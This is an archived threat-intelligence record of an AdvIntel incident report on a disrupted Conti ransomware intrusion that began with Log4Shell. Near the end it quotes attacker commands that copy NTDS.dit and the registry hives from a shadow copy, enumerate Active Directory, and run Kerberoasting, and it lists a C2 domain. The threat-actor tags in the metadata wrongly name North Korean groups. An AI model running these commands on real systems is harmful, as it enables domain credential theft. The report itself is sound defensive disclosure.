{
    "id": "64b259a2-a809-479d-9ec0-bf62644dc9ed",
    "created_at": "2023-01-12T15:10:05.61359Z",
    "updated_at": "2025-03-27T02:15:49.308371Z",
    "deleted_at": null,
    "sha1_hash": "70be1c115d06785a733a4e7f8218c54913650660",
    "title": "2022-02-23 - 24 Hours From Log4Shell to Local Admin- Deep-Dive Into Conti Gang Attack on Fortune 500 (DFIR)",
    "authors": "",
    "file_creation_date": "2022-05-28T04:46:19Z",
    "file_modification_date": "2022-05-28T04:46:19Z",
    "file_size": 2541083,
    "plain_text": "# 24 Hours From Log4Shell to Local Admin: Deep-Dive Into Conti Gang Attack on Fortune 500 (DFIR)\n\n**[advintel.io/post/24-hours-from-log4shell-to-local-admin-deep-dive-into-conti-gang-attack-on-fortune-500-dfir](https://www.advintel.io/post/24-hours-from-log4shell-to-local-admin-deep-dive-into-conti-gang-attack-on-fortune-500-dfir)**\n\nAdvIntel February 23, 2022\n\nFeb 23\n\n7 min read\n\n_By Vitali Kremez & Yelisey Boguslavskiy_\n\n_This redacted report is based on our actual proactive victim breach intelligence and subsequent_\n_incident response (not a simulated or sandbox environment) identified via unique high-value_\n_Conti ransomware collections at AdvIntel via our product “Andariel.”_\n\n24 Hours From Log4Shell to Local Admin by Conti Ransomware Group Targeting Fortune 500\n\n**TLP: WHITE // declassified as previously classified AdvIntel report on 02/23/2022.**\n\n\n-----\n\n_In the first week of February 2022, AdvIntel's operational interference successfully prevented a_\n_ransomware attack against one of the US’s Fortune 500. Using thorough adversarial_\n_investigation & technology, AdvIntel identified the intrusion and preemptively alerted the targeted_\n_entity, resulting in immediate preventative action that allowed the threat to be neutralized._\n\nAt the helm of this disrupted attack was Conti, the successor ofnotorious and highly capable\nRussian-speaking ransomware syndicate, Ryuk. Conti has torn through the defense systems of\n[innumerable prominent corporations and public service providers since its emergence in 2020.](https://digital.nhs.uk/cyber-alerts/2020/cc-3544)\n\nAdvIntel has identified that Conti was able to compromise critical domain trusts including the\nprimary domain. However, despite the fact that active directory and network shares were also\nsuccessfully compromised, enabling Conti to prepare targeted data theft for future extortion\n\n\n-----\n\npurposes, AdvIntel was able to disrupt data exfiltration or data loss, before criminals were able to\ntake action.\n\nThe attack started via the Log4J exploitation as exactly as specified in the article by the\nBlackBerry Research & Intelligence and Incident Response (IR) affecting Log4j vulnerability in\n[VMware Horizon. The attacker commands sequence observed was as follows via the AdvIntel](https://blogs.blackberry.com/en/2022/01/log4u-shell4me)\ndetection of Cobalt Strike commands resulting in the adversaries obtaining the NTDS and also\nmoving laterally to the remote administrator share allowing access to the domain and enterprise\nadministrator credentials via Mimikatz module. Finally, the adversaries leveraged remote\nexecution via PsExec and custom PowerShell active directory reconnaissance scripts.\n\n_The image reflects commands executed by Conti ransomware via the Cobalt Strike as_\n_intercepted by AdvIntel_\n\n\n-----\n\n**INVESTIGATIVE REVIEW: RANSONOMICS**\n\nConti’s targeted entity is a large, multinational company, with thousands of employees with\nreported several billions of dollars in revenue. This scale of operations is enough to constitute it\nas an economic microcosm, as this company’s continued functionality is an inextricable factor in\nthe success of the countless other companies who share their long, complex supply chains.\n\n_In other words, in this case, even a momentary interruption of business would be enough to_\n_cause a substantial amount of collateral damage, so with an estimated ransomware business_\n_interruption delta of three weeks or longer, a data blackout caused by a ransomware attack_\n_would be catastrophic._\n\nThe fear of cyber attacks shared by corporations as large and established as the target of this\nAdvIntel-disrupted attack comes from the ripple effects that would reverberate from any\ninterruption of business as usual. A production shutdown in any capacity immediately throws the\nlives and jobs of its massive worker populace into uncertainty: as key deadlines are missed,\ncontractual obligations to production associates and stakeholders are broken, fracturing trust and\ncosting the company large fees.\n\n_If this happens, product distribution and release is delayed. The company may experience loss in_\n_brand loyalty as frustrated customers choose to look elsewhere. According to AdvIntel’s_\nadvanced ransomware risk assessment, this type of standstill alone is enough to net the target a\nwhopping $20 million USD in setback costs, but even this does not cover the total damages.\n\nWhen data is stolen in a ransomware attack, money is lost due to the inability of the company to\ncomplete core functions that require information it no longer has—however, this chaos is not the\nsole motivation behind the attack. Ransomware groups, as their name suggests, demand large\n_sums for the return of their ill-gotten gains. In this case, based on AdvIntel’s visibility into the_\nConti syndicate, their initial demands for the return of target’s data would have likely been around\n**$50 million USD.**\n\nThis number seems incredibly high because an experienced syndicate such as Conti does not\nexpect that payment in full. Like an employee asking to double their salary during a performance\nreview, Conti asks victims for an unrealistically high ransom demand so that they have room to\n_negotiate down. By the time they reach an agreement, the estimated $15 million USD the target_\n\n\n-----\n\nwould likely end up paying would seem almost reasonable by comparison. Once paid, recovery\n_from the attack would still be a lengthy and expensive process. Another $1.5 million USD would_\nbe required to get operations back to where they were prior, and even then, there are now\n_endless legal complications, which might take months or even years to resolve and cost another_\n**$5 million USD to boot.**\n\nAttacks on household names such as in this case are likely to become headlines. After all, if the\ncompany’s systems were breached, its data stolen, what’s to stop customer information from\nleaking?\n\n**Estimated Loss Avoidance:** _~$30-40 million USD (According to AdvIntel’s 20-factor risk-_\n_assessment report and calculated damage estimation)._\n\n**FROM INFILTRATION → MITIGATION**\n\nTimely threat reporting and early mitigation enabled AdvIntel and the IT team of the targeted\ncompany to intervene when the initial domain breach was detected in early 2022. The initial\nvector of this attack was the popular utility logger Log4j, which has come under fire in recent\nmonths for its [increasingly exploited security vulnerabilities. However, AdvIntel possessed a](https://www.ftc.gov/news-events/blogs/techftc/2022/01/ftc-warns-companies-remediate-log4j-security-vulnerability)\nthorough understanding of this specific attack vector, having discovered Conti’s methodology for\nexploiting Log4j in December of 2021.\n\n\n-----\n\n_This AdvIntel graph shows the different elements that constitute a Log4j software exploitation._\n\nAfter the Java-based logging library’s CVE-2021-44228 vulnerability was discovered to be a\n**_10.0, or CRITICAL, by CISA’s vulnerability database, they predicted it would become a goldmine_**\nfor hackers to plumb. Only one week after the vulnerability was exposed, AdvIntel made an\n_unsettling discovery: Conti was leveraging VPN vulnerability CVE-2018-13379 to target_\n_unpatched devices for its initial attack vector, as is the case for this early breach._\n\nFrom that initial vector, Conti then compromised the remote monitoring and management\n_software agent, using the remote desktop application to analyze the network. As with Log4j,_\n[AdvIntel has noted previous exploitations via Atera in the past, explaining how it is employed by](https://www.advintel.io/post/secret-backdoor-behind-conti-ransomware-operation-introducing-atera-agent)\nConti as a legitimate remote monitoring software in order to avoid Cobalt Strike detection. This\nrepurposing of the software allows for the discrete installation of backdoor software variants such\nas Cobalt Strike as well as Trickbot, AnchorDNS, and BazarBackdoor.\n\n\n-----\n\n_Adversaries leverage Cobalt Strike command-line interfaces to interact with systems and execute_\n_other software during the course of a ransomware operation._\n\nWithout AdvIntel warning the company of this infiltration early, Conti would have almost certainly\nexfiltrated critical data and been able to hold it for blackmail purposes. Thankfully, they heeded\nour advice, and with additional investigation, managed to successfully locate Conti’s deployed\n_Cobalt Strike beacons and disrupt them, preventing the predicted damage._\n\nAdvIntel has evaluated several Conti-related Cobalt strike sessions in the past, understanding\nthat among thousands of potential threats, this root event lies at the center, needing to be dealt\nwith immediately. This innovative methodology of cyber risk prevention has disrupted several\npotential attacks of a similar scale in recent months, most recently allowing Chinese PC\n[manufacturer Lenovo to avoid a similar fate, as well as the Taiwanese Acer Inc.](https://adv-gate.com/andariel/new/#/platform/intelligence/report/-prevention-in-action-2021-12-10-advintel-identifies-backdoor-in-lenovo-networks-disrupts-impending-attack)\n\n\n-----\n\n**CONTI RANSOMWARE: AT A GLANCE**\n\nThe Conti syndicate is divided into six semi-autonomous teams, each having their own\nspecialized skills and targets. Team Two, which was responsible for this breach, tends to focus\non third-party compromises using lateral movement attacks. This means that the group’s\nmembers are proficient in moving undetected through networks while simultaneously increasing\n_their own access credentials and privileges. Like cancer, their presence quickly metastasizes_\nwithin the network as they shift from peripheral segments to core domains.\n\n_The “Shell Handler” method allows for penetration of a network that is unfeasible by more overt_\n_methods such as VPN and email attachment._\n\nWhat sets Conti apart from other ransomware groups is its coordination and functionality as an\n_organization. Where other ransomware groups are small and unsystematic, Conti has a business_\nmodel, defined strategies for attack, and the ability to work quickly and effectively as a unit. To\ndate, they are the only ransomware group that has truly earned the label of a syndicate. This is\nwhat makes them especially dangerous.\n\n**ATTACK CONTEXTUALIZATION**\n\n\n-----\n\nTo exemplify the potential damages and losses which could have been faced by the target in a\nsuccessful attack, AdvIntel refers to other recent notable ransomware high-tech\n**manufacturing attacks (with the use of CVEs). These attacks are similar to the one in this**\n**case study in terms of scale, attack vectors, and industry specifics.**\n\n**_ASUStek Computer Inc., April 2019_**\n\n**_Compal Electronics (by DoppelPaymer), November 2020_**\n\n**_Acer Inc. (by REvil), October 2021_**\n\n**_Quanta Computer Inc. (REvil),April 2021_**\n\n_Based on the Adversarial Assessment Scale utilized by the National Institute of Standards and_\n_Technology (NIST Special Publication 800-30, Guide for Conducting Risk Assessments, Table D-_\n_3), AdvIntel would consider Conti to be a 10 or VERY HIGH CAPABILITY, due to their level of_\n_expertise and resources, as well as their coordination and competency in executing high-level_\n_attacks._\n\n**Adversarial Assessment Summary [Conti]**\n\n\n-----\n\n**[Conti [Threat Group]](https://www.cisa.gov/uscert/ncas/alerts/aa21-265a)**\n\nMalware Type: Ransomware\n\nOrigin: Eastern Europe\n\nIntelligence Source: High Confidence\n\nFunctionality:\n\nData encryption\n\nData exfiltration\n\nBackup Removal\n\nUtilization of legitimate software agents\n\n**MITRE ATT&CK Framework:**\n\nT1486 - Data Encrypted for Impact\n\nT1106 - Native API\n\nT1083 - File and Directory Discovery\n\nT1140 - Deobfuscate/Decode Files or Information\n\nT1489 - Service stop\n\nT1490 - Inhibit System Recovery\n\nDistribution:\n\nBazarBackdoor\n\nTrickBot\n\nEmotet\n\nZloader\n\nIcedID\n\nPhishing / Email\n\nVulnerability exploitation (Log4Shell priority)\n\n**Persistency: Critical**\n\n\n-----\n\n**Infection Rate: High**\n\nDecrypter: Not Released\n\nAvg Ransom Demand: 5,000,000 USD - $10,000,000 USD\n\nAvg Ransom Payment: $500,000 USD\n\nAvg Operation Time: 1-2 weeks\n\nAvg Negotiation/Business Interruption Delta: 17 days\n\n**_Threat Assessment: Critical_**\n\n_nltest /dclist:_\n\n_wmic /node:\"REDACTED\" /user:\"DC\\REDACTED\" /password:\"REDACTED\" process call_\n_create \"cmd /c vssadmin create shadow /for=C: 2>&1\"_\n\n_wmic /node:\"REDACTED\" /user:\"DC\\REDACTED\" /password:\"REDACTED\" process call_\n_create \"cmd /c copy \\\\?_\n_\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit_\n_c:\\ProgramData\\nt & copy \\\\?_\n_\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM_\n_c:\\ProgramData\\nt & copy \\\\?_\n_\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SECURITY_\n_c:\\ProgramData\\nt\"_\n\n_powershell Get-ADComputer -Filter 'primarygroupid -eq \"516\"' ` -Properties_\n_Name,Operatingsystem,OperatingSystemVersion,IPv4Address | Sort-Object -Property_\n_Operatingsystem | Select-Object -Property_\n_Name,Operatingsystem,OperatingSystemVersion,Ipv4Address | Out-File_\n_C:\\ProgramData\\DC.txt_\n\n_powershell Get-ADComputer -Filter 'operatingsystem -like \"*server*\" -and enabled -eq_\n_\"true\"' -Properties Name,Operatingsystem,OperatingSystemVersion,IPv4Address | Sort-_\n_Object -Property Operatingsystem | Select-Object -Property_\n_Name,Operatingsystem,OperatingSystemVersion,Ipv4Address | Out-File_\n_C:\\ProgramData\\server.txt_\n\n_powershell Get-ADComputer -Filter 'operatingsystem -notlike \"*server*\" -and enabled -eq_\n_\"true\"' `-Properties Name,Operatingsystem,OperatingSystemVersion,IPv4Address | Sort-_\n_Object -Property Operatingsystem | Select-Object -Property_\n_Name,Operatingsystem,OperatingSystemVersion,Ipv4Address | Out-File_\n_C:\\ProgramData\\works.txt_\n\n\n-----\n\n_Invoke-Kerberoast -OutputFormat HashCat | fl | Out-File -FilePath_\n_c:\\ProgramData\\pshashes.txt -append -force -Encoding UTF8_\n\n**_Indicators of Compromise_**\n\n**_Cobalt Strike C2 Server:_**\n\n**_onesecondservice[.]com_**\n\n_Disrupt ransomware attacks & prevent data stealing with AdvIntel’s threat disruption solutions._\n_Sign up for AdvIntel services and get the most actionable intel on impending ransomware_\n_attacks, adversarial preparations for data stealing, and ongoing network investigation operations_\n_by the most elite cybercrime collectives._\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-02-23 - 24 Hours From Log4Shell to Local Admin- Deep-Dive Into Conti Gang Attack on Fortune 500 (DFIR).pdf"
    ],
    "report_names": [
        "2022-02-23 - 24 Hours From Log4Shell to Local Admin- Deep-Dive Into Conti Gang Attack on Fortune 500 (DFIR).pdf"
    ],
    "threat_actors": [
        {
            "id": "838f6ced-12a4-4893-991a-36d231d96efd",
            "created_at": "2022-10-25T15:50:23.347455Z",
            "updated_at": "2025-03-27T02:00:55.449316Z",
            "deleted_at": null,
            "main_name": "Andariel",
            "aliases": [
                "Andariel",
                "Silent Chollima",
                "PLUTONIUM",
                "Onyx Sleet"
            ],
            "source_name": "MITRE:Andariel",
            "tools": [
                "Rifdoor",
                "gh0st RAT"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "110e7160-a8cc-4a66-8550-f19f7d418117",
            "created_at": "2023-01-06T13:46:38.427592Z",
            "updated_at": "2025-03-27T02:00:02.830659Z",
            "deleted_at": null,
            "main_name": "Silent Chollima",
            "aliases": [
                "Subgroup: Andariel",
                "Onyx Sleet",
                "PLUTONIUM",
                "OperationTroy",
                "Guardian of Peace",
                "GOP",
                "WHOis Team",
                "Andariel"
            ],
            "source_name": "MISPGALAXY:Silent Chollima",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "4a502340-ae29-4a3a-8142-7fbbc2ec79b5",
            "created_at": "2024-05-01T02:03:08.138302Z",
            "updated_at": "2025-03-27T02:05:17.416542Z",
            "deleted_at": null,
            "main_name": "NICKEL HYATT",
            "aliases": [
                "Dark Seoul",
                "Jumpy Pisces ",
                "Onyx Sleet ",
                "RIFLE Campaign",
                "Silent Chollima ",
                "Andariel"
            ],
            "source_name": "Secureworks:NICKEL HYATT",
            "tools": [
                " DTrack",
                " Rifle",
                " UnitBot",
                " Valefor",
                "ActiveX 0-day"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a2b92056-9378-4749-926b-7e10c4500dac",
            "created_at": "2023-01-06T13:46:38.430595Z",
            "updated_at": "2025-03-27T02:00:02.831633Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "Operation DarkSeoul",
                "APT38",
                "ATK117",
                "DEV-1222",
                "G0032",
                "APT 38",
                "Stardust Chollima",
                "APT-C-26",
                "ATK3",
                "Diamond Sleet",
                "Hidden Cobra",
                "Unit 121",
                "Subgroup: Bluenoroff",
                "NICKEL GLADSTONE",
                "DEV-0139",
                "Andariel",
                "Operation Troy",
                "COVELLITE",
                "TA404",
                "Lazarus group",
                "Dark Seoul",
                "G0082",
                "NewRomanic Cyber Army Team",
                "Bluenoroff",
                "Appleworm",
                "Nickel Academy",
                "COPERNICIUM",
                "Hastati Group",
                "Bureau 121",
                "Operation AppleJeus",
                "Whois Hacking Team",
                "Citrine Sleet",
                "Sapphire Sleet",
                "Group 77",
                "Labyrinth Chollima",
                "Operation GhostSecret",
                "BeagleBoyz"
            ],
            "source_name": "MISPGALAXY:Lazarus Group",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "bc6e3644-3249-44f3-a277-354b7966dd1b",
            "created_at": "2022-10-25T16:07:23.760559Z",
            "updated_at": "2025-03-27T02:02:09.968605Z",
            "deleted_at": null,
            "main_name": "Andariel",
            "aliases": [
                "APT 45",
                "Andariel",
                "Jumpy Pisces",
                "Onyx Sleet",
                "Operation BLACKMINE",
                "Operation BLACKSHEEP/Phase 3.",
                "Operation Blacksmith",
                "Operation DESERTWOLF/Phase 3",
                "Operation GHOSTRAT",
                "Operation GoldenAxe",
                "Operation INITROY/Phase 1",
                "Operation INITROY/Phase 2",
                "Operation Mayday",
                "Operation VANXATM",
                "Operation XEDA",
                "Plutonium",
                "Silent Chollima",
                "Stonefly"
            ],
            "source_name": "ETDA:Andariel",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536205,
    "ts_updated_at": 1743041749,
    "ts_creation_date": 1653713179,
    "ts_modification_date": 1653713179,
    "files": {
        "pdf": "https://archive.orkl.eu/70be1c115d06785a733a4e7f8218c54913650660.pdf",
        "text": "https://archive.orkl.eu/70be1c115d06785a733a4e7f8218c54913650660.txt",
        "img": "https://archive.orkl.eu/70be1c115d06785a733a4e7f8218c54913650660.jpg"
    }
}